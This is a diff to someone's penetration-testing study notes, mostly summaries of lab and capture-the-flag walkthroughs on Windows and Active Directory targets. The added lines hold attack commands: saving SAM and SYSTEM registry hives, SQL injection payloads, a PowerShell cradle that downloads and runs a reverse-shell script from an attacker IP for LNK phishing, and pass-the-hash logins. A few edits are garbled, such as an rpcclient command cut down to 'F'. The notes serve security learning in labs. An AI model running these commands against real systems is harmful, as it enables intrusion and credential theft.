@@ -1188,6 +1188,7 @@ $snap.LogPipelineExecutionDetails = $false # Set ps-snapin execution details to 
 
 ----------------
 History powershell
+$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 $historyPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
 Test-Path $historyPath
 
@@ -1428,6 +1429,10 @@ reg.exe save hklm\sam C:\temp\sam.save
 reg.exe save hklm\system C:\temp\system.save
 Crack using tools like secreddump.py: https://raw.githubusercontent.com/fortra/impacket/master/examples/secretsdump.py
 python3 secretsdump.py -sam sam.save -system system.save LOCAL
+
+reg.exe save hklm\sam x:\sam.save
+reg.exe save hklm\system x:\system.save
+
 -----------------------------------------------------
     </code></pre>
 </div>
@@ -1764,6 +1769,25 @@ procdump64.exe -ma [pid]
     </code></pre>
 </div>
 
+<div class="github-dark">
+    <pre><code>
+-------------------[Ippsec cicada]------------------------------
+-ippsec explained how nxc smb [ip] -u '.' -p '' --rid-brute works 
+-  it is like rpcclient -U 'CICADA.htb/' [ip]
+- then instead of lookupnames administrator
+- it does lookupsids S-1-5-..-500 and increase 500
+- he then wanted to see the description of users so he run
+- nxc smb [ip] -u 'founduser' -p 'foundpss' --users
+- he also said once it is a DC it is not always works dumping the sam because the DC uses ntds to save passwords a nd that is a little bit harder to backup
+- he said but before you promot it to domain it will have the old password there so if they do not change the password of admin after you make it a domain controller then you can just get it quickly with this way
+- he also explained what unix2dos does 
+------------------------------------------------------------------------------------------------------------
+
+
+    </code></pre>
+</div>
+
+
 
 <div class="github-dark">
     <pre><code>
@@ -1804,8 +1828,14 @@ however, CORS can ruin this if the internal resource you want to access is not i
 <div class="github-dark">
     <pre><code>
 -------------------[SQLmap inline proxy]--------------------------------
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]
+
+view=request&request=log&task=query&limit=100..%2C%2C.%22.%27%28%2C
+view=request&request=log&task=query&limit=100%27OqItnQ%3C%27%22%3EPWubGA
+
 [boolean-based blind] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
 POST /product?id=1) AND 8396=7356 AND (4412=4412 HTTP/1.1
+
 [10:58:14] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --code=200)
 
 [Generic inline queries] [INFO] testing 'Generic inline queries'
@@ -2105,6 +2135,16 @@ But you need to be lucky that the other internal site in the same origin, or the
     </code></pre>
 </div>
 
+<div class="github-dark">
+    <pre><code>
+-------------------[Ippsec Falafel ]--------------------------------
+- in the machine there was only ssh and web open, ippsec not only got  users from the web error butt he also did some sql injection to get the password instead of first  trying to brute the username than the password
+------------------------------------------------------------------------------------------------------------
+
+
+    </code></pre>
+</div>
+
 
 <h2 id="description"><a href="#description">Changed my understanding</a></h2>
 
@@ -2298,7 +2338,7 @@ this is the path to read the powershell commands
 C:\Users\legacyy\APPDATA\roaming\microsoft\windows\powershell\psreadline/ConsoleHost_history.txt
 
 he also used bloodhound ingestor using the command:
-python3 bloodhound.py -c all -dc dc01.timelapse.htb -d timelapse -u svc_deploy -p '' -ns []ip
+python3 bloodhound.py -c all -dc dc01.timelapse.htb -d timelapse -u svc_deploy -p '' -ns dc-ip
 ------------------------------------------------------------------------------------------------------------
 
 
@@ -2308,7 +2348,7 @@ python3 bloodhound.py -c all -dc dc01.timelapse.htb -d timelapse -u svc_deploy -
 <div class="github-dark">
     <pre><code>
 -------------------[Me tryhackme - Ultratech]--------------------------------
-backtick - enable you to files in the system which is like XXE or LFI
+backtick - enable you to files in the system which is like XXE or LFI [update after offsec, offsec says LFI enable you to execute things like the path-traversal/LFI to get shell in teh lab. while path traversal is the one enable you to read files]
 
 when i discovered that there is an api that takes an ip address from me to ping i knew that the ping . $myinput is behind the hood
 the api was like 10.10.186.172:8081/ping?ip=
@@ -2469,12 +2509,40 @@ log files will get put here
     </code></pre>
 </div>
 
+
+<div class="github-dark">
+    <pre><code>
+-------------------[ippsec sizzle  ]--------------------------------
+- when ippsec tried to run sharphound.exe and he could blocked by app locker he searched for app blocker bypass
+------------------------------------------------------------------------------------------------------------
+
+
+    </code></pre>
+</div>
+
+<div class="github-dark">
+    <pre><code>
+-------------------[ippsec Mist  ]--------------------------------
+- after ippsec found the version of the pluck he wanted to get the release date using the github release after that he know all the cve under that version
+- he knew pluck is open source see he prefered to see the github for its directories rather then bruteforcing the dir
+- then he did the cradle file that has IEX(new.object net.webclient).downloadstring("http://10.10.14.8:800/rev.ps1") then
+- cat cradle | iconv -t utf-16le | base64 -w0;echo
+- this is a good source to hide revrse shell in a lnk file for phisshing to access as the user phished
+- he also used chisel for dynamic port  forwarding
+- he also steal the user's ntlmv2 hash via responder
+- he also using bloodhound docker
+------------------------------------------------------------------------------------------------------------
+
+
+    </code></pre>
+</div>
+
 <div class="github-dark">
     <pre><code>
 -------------------[ippsec querier  ]--------------------------------
 - ippsec usually do this way of scanning
 - nmap -p- -oN allports.nmap [ip]
-- cat allports.nmap | grep ^[0-9] | awk -F/ '{print $1}' | sort -u > ports
+- cat allports | grep ^[0-9] | awk -F/ '{print $1}' | sort -u > ports
 - for i in $(cat ports); do echo -n $i,; done
 - nmap -sC -sV -p .. [ip]
 - very very interesting and make me feel exploting windows is tricky and smart
@@ -2754,6 +2822,8 @@ smbmap -H 10.129.14.128 --download "notes\note.txt"
 smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"
 
 We can use the rpcclient tool with a null session to enumerate a workstation or Domain Controller.
+
+[*] get domain users - like smb anonymous shares rpc anonymous loggin enable you to retrieve domain users, it is better to use querydispinfo than the ippsec enumdomusers also check srvinfo
 
 Viyky7@htb[/htb]$ rpcclient -U'%' 10.10.110.17
 
@@ -3258,7 +3328,7 @@ If we wished to enumerate all users to gather the RIDs for more than just one, w
 
 Enumdomusers
   Credentialed Enumeration - from Linux
-rpcclient $> enumdomusers
+rpcclient $> F
 
 user:[administrator] rid:[0x1f4]
 user:[guest] rid:[0x1f5]
@@ -4128,6 +4198,36 @@ The other bypass mechanisms is the HTTP parameter pollution (HPP), where payload
 </div>
 
 <h2 id="description"><a href="#description">manifestation</a></h2>
+
+
+<div class="github-dark">
+    <pre><code>
+-------------------[ippsec Blackfield]--------------------------------
+- ippsec wanted to mount the smb share to kali so he use mount -t cifs '//10.10.10.192/profiles$' /mnt
+- when ippsec found users he user 
+  kerbrute userenum --dc dc-aip -d blackfield  -o kerbrute.userenum.out user.lst
+- now since he has users he used a tool to find which user has no pre-aut 
+  required using GetNPUsers.py -dc-ip 10.10.10.192 -no-pass -userfile users.lst blackfield/
+- ippsec after having the creds of one user he said we can get the user password account policy using cme smb dc-ip --pass-pol but he couldn't access it
+- when ippsec found the user he again used rpcclient -U support dc-ip to run 
+  enumdomusers
+- when ippsec found that he has the right to change password of a user in bloodhound he didn't use bloodhound command instead he used rpcclient -U support 10.10.10.192 then setuserinfo2 Autdot2020 23 'PleaseSubs'
+- when he wanted to mount with username and pass he used 
+  mount -t cifs -o 'username=audit2020,password=PleaseSub!' //10.10.10.192/forensic /mnt
+- with the SeBakcupPrivilege ippsec wanted to create a backup of the c but he used wbadmin istead of diskshadow.exe
+wbadmin start backup -backuptarget:\\10.10.14.2\SendMeYodata -include:c:\windows\ntds
+- beside the ignitetechnology SeBakcupPrivilege book this ippsec episode has another interesting way of doing it but in the ippsec method the idea is to mount to kali so kali gets the full backup
+- ippsec after extracting the hashed with hte SeBackupImpersonate he wanted to log in as admin so he used
+psexec.py -hashes LM/hash:hash administrator@10.10.10.192
+- he also said the psexec.py doesn't use the LM hash portion butt psexec only wants to see it 
+- ippsec found a file root.txt he wanted to read he couldn't because he has to use cipher.exe /c root.txt but he also can't because psexe.py dropped him as system and he can't with system 
+- so he used the same as the above command but the script wmiexec.py instead to run same as the admin priv user
+- then it turned out he can read it with admin
+------------------------------------------------------------------------------------------------------------
+
+
+    </code></pre>
+</div>
 
 <div class="github-dark">
     <pre><code>
